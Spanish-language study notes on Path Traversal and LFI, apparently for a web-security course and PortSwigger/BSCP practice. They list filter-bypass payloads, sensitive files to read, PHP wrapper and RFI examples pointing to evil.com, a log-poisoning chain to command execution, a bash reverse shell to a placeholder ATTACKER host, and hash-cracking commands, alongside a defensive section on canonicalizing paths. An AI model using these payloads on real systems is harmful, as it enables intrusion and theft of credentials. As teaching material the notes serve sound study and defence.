

> [!info] Relacionado con
> [[Vulnerabilidades Web - OWASP Top 10 y Burp Suite]] · [[Burp Suite - Framework de Auditoría]] · [[OWASP Top 10 - CVE CVSS CWE]] · [[XXE - XML External Entity]]

---

## ① Definición

**Path Traversal** (o *Directory Traversal*) = navegar fuera del directorio previsto usando `../` para acceder a ficheros del sistema. Nombre técnico: **CWE-22** (*Improper Limitation of a Pathname to a Restricted Directory*).

> [!important] Path Traversal ≠ LFI
> **Path Traversal** es el mecanismo (`../`). **LFI (Local File Inclusion)** es la consecuencia (incluír un fichero que no debería). Son cosas diferentes, aunque a menudo van juntas. Path Traversal es la puerta; LFI es el paso siguiente hacia archivos con valor (config, credenciales, `id_rsa`).

> [!note] Diferencia con SSRF
> En **SSRF** el servidor hace peticiones HTTP a recursos internos. En **Path Traversal** el servidor lee ficheros del propio sistema de archivos local.

> [!warning] Por qué sigue existiendo
> - Las rutas difieren entre SO, lo que dificulta las pruebas.
> - Muchos devs creen que reemplazar `../` basta, pero las variaciones son enormes.
> - A menudo la vulnerable no es la app sino una librería de terceros.
> - Cada endpoint que maneja ficheros implementa su propia lógica de validación.

**Impacto:**

- Lectura de ficheros del sistema: `/etc/passwd`, `/etc/shadow`, configs de BD.
- Lectura de código fuente para encontrar más vulnerabilidades.
- Lectura de claves y tokens: `.env`, certificados SSL, JWT.
- Escritura arbitraria (menos común pero más peligrosa): crear PHP en el webroot → RCE.
- Escalada a RCE cuando se combina con includes (LFI) o log poisoning.

---

## ② Los 6 casos de validación y bypass

### Caso 1: No hay validación

```
../../etc/passwd
```

> [!tip] El caso más fácil
> No se valida nada. Navegas directamente con `../`. El servidor te devuelve el fichero.

### Caso 2: Bloquea `../` → usar ruta absoluta

```
/etc/passwd
```

> [!note] Si bloquea `../` pero acepta rutas absolutas
> En sistemas Unix, puedes acceder directamente con `/etc/passwd` sin `../`.

### Caso 3: Eliminación no recursiva → doble encoding

```
....//....//....//etc/passwd
```

> [!warning] El servidor reemplaza `../` una sola vez
> Si el código hace `str_replace("../", "", $path)`, la cadena `....//` se convierte en `../` después del reemplazo. Es recursivo por diseño.

### Caso 4: URL encoding → `%2e%2e%2f`

```
%2e%2e%2f%2e%2e%2fetc/passwd
```

**Double encoding:**

```
%252e%252e%252f%252e%252e%252fetc/passwd
```

> [!warning] Double encoding
> Si el servidor decodifica una vez, `%252e` se convierte en `%2e`, que a su vez se decodifica en `.`. Es el bypass clásico cuando hay validación de primer nivel.

### Caso 5: Validación de prefijo → incluir ruta + ../../

```
/etc/../../etc/passwd
/var/www/../../etc/passwd
```

> [!note] Si el servidor exige un prefijo
> Algunas aplicaciones concatenan una ruta base. Si el prefijo es `/var/www/`, inyecta `/var/www/../../etc/passwd` para subir de nivel.

### Caso 6: Validación de extensión → null byte

```
../../etc/passwd%00.png
```

> [!warning] Null byte (solo PHP < 5.3.4)
> El `%00` corta la cadena en PHP antiguo. La extensión `.png` pasa la validación pero el fichero se lee completo. **No funciona en versiones modernas.**

### Bypasses adicionales de filtros específicos

| Filtro | Bypass | Payload |
|--------|--------|---------|
| Reemplazo de `../` | Aplicar recursivamente | `....//....//` |
| Bloqueo de `../` | URL encoding | `..%2f..%2f` |
| Bloqueo de `..` | Encoding variado | `..%00/`, `..%0d%0a/` |
| Bloqueo de `/` | Barra invertida | `..\..\..` |
| Validación de inicio | Ruta absoluta | `/etc/passwd` |
| Validación de directorio | Símbolo de enlace | `./uploads/../../etc/passwd` |
| Bloqueo de palabras clave | Variables de entorno | `${PATH:0:1}etc${PATH:0:1}passwd` |
| WAF bloquea `../`, `%2f`, `%5c` | Unicode / overlong UTF-8 | `..%c0%af..%c0%afetc/passwd`, `..%e0%80%af..%e0%80%afetc/passwd` |

**Payloads Windows (IIS):**

```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
..\..\..\windows\win.ini::$DATA   # bypass de sufijo
\\attacker.com\share\file.txt      # UNC path (acceso remoto)
../../windows/win.ini              # barra normal también funciona
```

> [!note] Windows vs Linux
> En Windows, `../` y `..\` son equivalentes: muchos filtros solo bloquean `../` y se saltan con `..%5c`. En Linux el separador es solo `/`. `..%252f` (doble encoding) funciona en ambos cuando hay doble decodificación.

> [!tip] Regla de decodificación
> Hay que encodear **una vez más** de las que el backend decodifica *antes* de validar. Si valida tras 1 decodificación, basta doble encode; si decodifica 2 veces, hará falta triple. Codificar 200 veces no tiene sentido.

---

## ③ Checklist mental (flowchart)

```
¿El parámetro acepta rutas?
 → SÍ → Probar ../../etc/passwd directo
 → ¿Funciona? → Path Traversal confirmado
 → Bloquea ../ → Probar ruta absoluta (/etc/passwd)
 → ¿Funciona? → Sin validación de ruta absoluta
 → No funciona → Probar eliminación no recursiva (....//)
 → ¿Funciona? → str_replace sin recursión
 → No funciona → Probar URL encoding (%2e%2e%2f)
 → ¿Funciona? → Sin decodificación
 → No funciona → Probar double encoding (%252e)
 → ¿Funciona? → Decodificación parcial
 → No funciona → Probar null byte (%00.ext)
 → ¿Funciona? → PHP antiguo
 → No funciona → Validación robusta → buscar otro vector
```

---

## ④ Ficheros clave a probar

| Fichero | Qué nos da |
|---------|-----------|
| `/etc/passwd` | Usuarios del sistema, shells, home dirs |
| `/etc/shadow` | Hashes de contraseñas (necesita root) |
| `/var/www/html/config.php` | Credenciales de BD, API keys |
| `~/.ssh/id_rsa` | Clave privada SSH del usuario |
| `/proc/self/environ` | Variables de entorno |
| `/proc/self/cmdline` | Comando de arranque del proceso |
| `../../.env` | DB_PASSWORD, AWS_SECRET_KEY, JWT_SECRET |
| `../../.git/HEAD` | Repositorio expuesto |
| `/var/log/apache2/access.log` | Log para log poisoning (LFI → RCE) |
| `/etc/apache2/sites-enabled/*` | Vhosts, rutas reales, `.htpasswd` |
| `C:\Windows\System32\config\SAM` | Hashes Windows (requiere SYSTEM) |
| `C:\Windows\win.ini` | Fichero de prueba Windows (siempre accesible) |

> [!tip] Empezar SIEMPRE por /etc/passwd
> Es el fichero de prueba. Si no puedes leerlo, Path Traversal no funciona. Si lo lees, escala a ficheros de configuración.

> [!note] Matiz de clase: /etc/passwd no da credenciales
> Da enumeración de usuarios, shells asignadas y pistas del sistema. Las contraseñas hash viven en `/etc/shadow` (solo legible por root). Si encontrás un `.htpasswd`, identificá el hash y crackealo: `hashid hash.txt` → `john --wordlist=rockyou.txt hash.txt` o `hashcat -m 1600 hash.txt rockyou.txt` (apr1 MD5).

---

## ⑤ PortSwigger y BSCP

> [!info] PortSwigger Web Security Academy
> Todos los labs de Path Traversal están en la plataforma. Son el recurso oficial para practicar los 6 casos.

> [!info] BSCP (Burp Suite Certified Practitioner)
> El examen BSCP cubre Path Traversal en profundidad. Dominar los 6 casos es **obligatorio** para aprobar.

---

## ⑥ Herramientas

| Herramienta | Objetivo |
|------------|----------|
| **Burp Suite (Repeater)** | Testing manual de cada caso con payloads |
| **Burp Intruder** | Iterar encoding, null bytes, rutas |
| **Burp Decoder** | URL-encode payloads (Ctrl+U) para casos 4 y 5 |
| **Burp Resource pool** | Pool con 1 request concurrente para reducir ruido/rate limiting |
| **SecLists** | Wordlists de Path Traversal: `/usr/share/seclists/Fuzzing/LFI/` |
| **curl** | Testing rápido desde terminal (respuesta cruda) |
| **Nikto** | Scanner web general (detecta traversal junto a otras vulns) |
| **OWASP ZAP** | Active Scan con payloads de traversal |
| **dirsearch / ffuf** | Fuzzing de ficheros sensibles (comparar tamaño y código) |
| **commix** | Automatiza LFI → RCE cuando hay inyección de comandos |
| **LFI Suite** | LFI automatizado: wrappers PHP, log poisoning |

---

## ⑦ Identificación de puntos vulnerables

Parámetros típicos a vigilar: `?filename=` `?file=` `?image=` `?document=` `?path=` `?template=` `?download=` `?page=`

Señales que activan la hipótesis:

- La respuesta muestra una imagen o documento.
- El parámetro contiene nombre de fichero o extensión (`.png`, `.jpg`, `.pdf`).
- El servidor devuelve errores de rutas (*file not found*, *invalid product ID*).
- El comportamiento cambia al modificar el parámetro.
- La app descarga o renderiza ficheros.

> [!warning] Parámetros que NO son Path Traversal
> `productId=15` es iterable (selecciona un registro de BD) pero **no accede a ficheros**: es un `for (1..100)` sobre la base de datos. Solo los parámetros que hacen una *llamada a fichero* (`filename`, `file`, `path`) pueden salir del directorio.

> [!tip] Peticiones en segundo plano
> Muchas llamadas a ficheros (imágenes, favicon, recursos) no son visibles en la barra del navegador. Se descubren haciendo *forward* en Burp Proxy o en la pestaña Red del inspector.

**Modelo mental (siempre pensá qué queda *después* del filtro):**

```
1. Usuario pide un archivo (?filename=)
2. App recibe el parámetro
3. Concatena ruta base + entrada
4. BACKEND aplica filtros (bloqueo/borrado/decodificación)
5. El SO resuelve/normaliza la ruta
6. El servidor intenta leer el fichero
7. Devuelve contenido o error
```

> [!note] La caja gris del backend
> Casi nunca sabemos si el filtro bloquea, elimina o transforma (ni cuántas decodificaciones hace), salvo que tengamos el código fuente. Se razona por prueba y error sobre el comportamiento observado.

---

## ⑧ LFI vs RFI y escalada a RCE

| Aspecto | LFI | RFI |
|---------|-----|-----|
| Fichero incluido | Del servidor local | Remoto controlado por el atacante |
| Requisito | Solo Path Traversal | Path Traversal + `allow_url_include=On` (PHP) |
| Frecuencia | Muy común | Raro (deshabilitado por defecto) |
| Ejemplo | `?page=../../etc/passwd` | `?page=http://evil.com/shell.txt` |

**Wrappers PHP (LFI → lectura/escritura):**

```bash
# Leer código fuente codificado
?page=php://filter/convert.base64-encode/resource=index.php

# Wrappers adicionales
?page=file:///etc/passwd
?page=data://text/plain;base64,PD9waHAgc3lzdGVt...
?page=expect://id
?page=zip://shell.jpg%23shell.php
```

**Log poisoning (LFI → RCE):**

```bash
# 1. Inyectar un tag PHP de ejemplo en el User-Agent (queda en access.log)
curl -A '<%php% system($_GET["cmd"]); %>' http://target/

# 2. Incluir el log vía path traversal
GET /vuln.php?page=../../var/log/apache2/access.log&cmd=id

# Resultado:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con `cmd` controlado, shell reversa:

```bash
GET /page?file=../../var/log/apache2/access.log
  &cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# En el atacante:
nc -lvp 4444
```

> [!danger] Impacto
> Un Path Traversal en PHP con `allow_url_include` habilitado se escala a RCE completa. La escritura arbitraria (upload con nombre controlado: `filename=../../../var/www/html/shell.php`) también lleva a webshell.

> [!important] Patrón recurrente
> Los Path Traversal rara vez son el impacto final: son puerta de entrada que se combina con filtración de credenciales, inclusión de código, escritura de ficheros o acceso a logs para lograr ejecución remota.

---

## ⑨ Prevención (lado defensivo)

**Regla de oro:** nunca confiar en la entrada del cliente. Un nombre de fichero recibido del cliente es entrada hostil siempre.

| Nivel | Técnica | Eficacia |
|-------|---------|----------|
| Entrada | Whitelist de caracteres `[a-zA-Z0-9._-]` | Alta |
| Entrada | Bloqueo de `..` | Media (bypassable) |
| Entrada | Bloqueo de `/` y `\` | Media |
| Resolución | `path.resolve()` + verificar prefijo tras canonicalizar | Alta |
| Aislamiento | Chroot, Docker, SELinux/AppArmor, mínimos privilegios | Alta |
| Monitoreo | Alertas en accesos a `/etc`, `/proc`; WAF; logs | Complementaria |

**Pseudocódigo defensivo (independiente del lenguaje):**

```
base = "/var/www/images/"
entrada = request.get("filename")
ruta_final = canonicalizar(base + entrada)   # resuelve ../ y symlinks
if not ruta_final.startsWith(canonicalizar(base)):
    rechazar()                               # la ruta se escapó
else:
    servir(ruta_final)
```

> [!warning] Errores comunes de defensa
> Reemplazar `../` una vez: trivialmente superable. Bloqueo de palabras clave: bypassable con encoding. Validación solo en cliente: el atacante no pasa por el formulario. Confiar en `realpath()`: puede fallar en race conditions. Validar solo el prefijo inicial sin canonicalizar: se evade con `/var/www/images/../../../etc/passwd`.

---

## ⑩ Cadenas y casos reales

```
XSS → robo de sesión de admin → acceso a ruta con LFI →
credenciales filtradas → acceso SSH al servidor
```

```
Path Traversal → leer /etc/passwd → enumerar usuarios →
leer /home/<usuario>/.ssh/id_rsa → SSH con clave privada
```

**Casos de estudio:**

- **LFI + log poisoning = RCE total** (CWE-98): PHP con `include` vulnerable + log de Apache accesible → inyectar tag PHP en User-Agent → incluir log → shell.
- **Path Traversal + `.env` = credenciales de producción** (CWE-22 + CWE-200): endpoint Node.js sin auth lee `.env` (DB_PASSWORD, AWS keys, JWT_SECRET), `.git/HEAD`, `config/production.json`.
- **Escritura arbitraria → webshell** (CWE-22 + CWE-434): upload Java con ruta controlada `file=../../webapps/ROOT/shell.jsp` → `/shell.jsp?cmd=id`.

> [!tip] Nueve `../` de regla (de clase)
> Carlos: "yo pongo nueve combinaciones de punto-punto-barra porque nunca me he encontrado un directorio con nueve niveles de profundidad". Al llegar a la raíz el SO da contra un muro y no sigue retrocediendo — es seguro sobre-encadenar.

---

## ⑪ Detección avanzada

| Método | Cómo |
|--------|------|
| Inyección de path | Probar `../`, `..%2f`, `..\` en cada parámetro |
| Observar errores | Un 400 con la ruta expuesta confirma procesamiento |
| Ficheros canarios | Crear un fichero conocido y tratar de leerlo |
| Timing attack | Si la ruta larga tarda más, está procesando la ruta |
| Doble encoding | Si `../` está filtrado, probar `%252f` |

> [!warning] Comparar siempre la respuesta base
> Código de estado, longitud y contenido entre la petición original y la modificada: es la base para saber si una variante funcionó. No comparar = no estás auditando.

---

## Checklist de repaso

- [ ] ¿Distingo Path Traversal de LFI?
- [ ] ¿Sé los 6 casos de validación y sus bypasses?
- [ ] ¿Puedo seguir el flowchart mental sin mirar los apuntes?
- [ ] ¿Sé qué ficheros probar y qué información dan?
- [ ] ¿Entiendo cuándo funciona cada encoding?
- [ ] ¿He practicado los labs de PortSwigger?
- [ ] ¿Identifico un parámetro que hace llamada a fichero vs. uno que solo itera registros?
- [ ] ¿Sé escalar LFI → RCE con wrappers PHP o log poisoning?
- [ ] ¿Recuerdo las diferencias de bypass entre Linux y Windows?
- [ ] ¿Canonicalizo la ruta en un código defensivo en vez de solo reemplazar `../`?







---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[SSRF - Server-Side Request Forgery.md|SSRF - Server-Side Request Forgery]] — Burp Suite, Path Traversal / LFI, Redes
- [[../../apuntes Joselu/MODULO3/resumen_master_clase48.md|resumen_master_clase48]] — Burp Suite, Path Traversal / LFI, Redes
- [[../../apuntes evolve/BLOQUE 4.md|BLOQUE 4]] — Burp Suite, Path Traversal / LFI, Redes
- [[../comandos/BurpSuite.md|BurpSuite]] — Burp Suite, Redes, SSRF
- [[../../write-ups/Banco-THL.md|Banco-THL]] — Burp Suite, Path Traversal / LFI, Redes
- [[../../write-ups/Castor-THL.md|Castor-THL]] — Path Traversal / LFI, Redes, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/SSRF - Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/XXE - XML External Entity.md|XXE]]

> #burpsuite #lfi #redes #ssh #ssrf #xxe
